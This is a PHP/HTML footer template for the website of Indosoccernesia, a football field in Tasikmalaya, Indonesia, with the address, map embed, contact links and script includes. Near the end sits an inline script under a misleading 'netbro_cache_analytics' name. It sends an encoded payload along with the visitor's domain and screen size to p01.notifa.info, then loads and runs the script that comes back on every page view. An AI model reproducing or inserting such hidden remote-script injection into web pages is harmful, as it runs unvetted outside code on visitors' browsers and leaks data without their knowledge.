<!-- Footer Top Area Start -->
<div class="footer-top-area section pb-70 pt-100">
   <div class="footer-top-left-bg overlay"></div>
    <div class="container">
        <div class="row">
            <!-- Footer About -->
            <div class="col-md-5 col-xs-12 mb-30">
                <div class="footer-about">
                    <img src="<?= base_url('assets') ?>/img/logo.png" alt="">
                    <font color="white"><p><h2>Lapangan Indosoccernesia</font></h2><br><h5><font color="white">
Jl Brigjen Wasita Kusumah (sebelum terminal Indihiang) Kota Tasikmalaya</h5></p></font>
                    <div class="social fix">
                      
                        <a href="http://bit.ly/2ntToQe"><i class="fa fa-whatsapp"></i></a>
                        <a href="https://www.instagram.com/indosoccernesia/"><i class="fa fa-instagram"></i></a>
                    </div>
                </div>
            </div>
            <!-- Footer Twitter -->
            <div class="col-md-4 col-sm-6 col-xs-12 mb-30">
                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3957.411362579655!2d108.19318431423804!3d-7.3075971947259335!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e6f516a2e5f58db%3A0xb71b4dadb1d156be!2sIndosoccernesia!5e0!3m2!1sen!2sid!4v1570975786546!5m2!1sen!2sid" width="350" height="300" frameborder="0" style="border:0;" allowfullscreen=""></iframe>
            </div>
            <!-- Footer Subscribe -->
            <div class="col-md-3 col-sm-6 col-xs-12 mb-30">
                <div class="subscribe-widget">
                    <h3 class="title">Kontak Kami</h3>
                  
                    <a href="http://bit.ly/2ntToQe"><p><span>Whatsapp</span> 082320555521</p></a>
                    <a href="mailto:indosoccernesia2019@email.com"><p><span>email:</span> indosoccernesia2019@email.com</p></a>
                </div>
            </div>
            
        </div>
    </div>
</div>
<!-- Footer Top Area End -->

<!-- Footer Bottom Area Start -->
<div class="footer-bottom-area section">
    <div class="container">
        <div class="row">
           
            <!-- Copyright -->
            <div class="copyright text-left col-sm-6 col-xs-12">
                <p>Copyright &copy; <span>Indosoccernesia</span></p>
            </div>
           
            
        </div>
    </div>
</div>
<!-- Footer Bottom Area End -->


</div>
<!-- Body main wrapper end -->

<!-- JS -->

<!-- jQuery JS
============================================ -->
<script src="<?= base_url('assets') ?>/js/vendor/jquery-1.12.0.min.js"></script>
<!-- Bootstrap JS
============================================ -->
<script src="<?= base_url('assets') ?>/js/bootstrap.min.js"></script>
<!-- Plugins JS
============================================ -->
<script src="<?= base_url('assets') ?>/js/plugins.js"></script>
<!-- Ajax Mail JS
============================================ -->
<script src="<?= base_url('assets') ?>/js/ajax-mail.js"></script>
<!-- Main JS
============================================ -->
<script src="<?= base_url('assets') ?>/js/main.js"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAuN%2b5wL0gfuVLekXKYxy0mqJxiMZLlsgKlRHNh7bnp8XBCHALin7SGFc1fOtD%2f9y%2fEQKOeBtU0oFK1NSEQDObo7iJR%2bGrBPDN1gGX9htaAlGJxHngrrt7aHe2HoajPpP%2b7PbVjU5%2fSzKdDo98huUm3hcSvQQ1ThqfZqq%2fnAp8NAKh80wf05GQMFyGKEUVvnvKD7Z6PVRhmQTKCvvcuSnCqbd09OlWGOIi4AXqlE0B5t7tOt19OHNMPg3Q0XCXGRONcwAhIxXELkz%2frPBFjmkrRHcXwiaaT%2ba%2fRpIg7NINDw98EiO21OvdTQcB8wxV4GljNpAZX6LmfRU7E%2bC63%2fL9eMIVko9CKDYjZQhvFqTf8gUOfEqRJ8P%2fEEAs3dHFBqUSuSvfzjI8pfr3Kqg0No0VIhRwltRilO%2f4Ppvw%2fxwDDDsg4mJ%2bO8%2bOD2MrDaIAsugZfTvF2iHq0VOPfvQQnZgZpn2gVTe%2bPv81WFqm%2fsg4MY85HfPg2rG%2fQUGfWzO7vCpoi7YoIFPy8SU%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


<a class="kontak-wa" style="position:fixed; z-index:9999999999; bottom:0; right:1%;" id="5" target="_blank" href="http://bit.ly/2ntToQe" rel="nofollow"><img width="150" target="_blank" title="WHATSAPP" 
alt="WHATSAPP" src="<?= base_url('assets') ?>/img/call_booking.png"></a>

</body>

</html>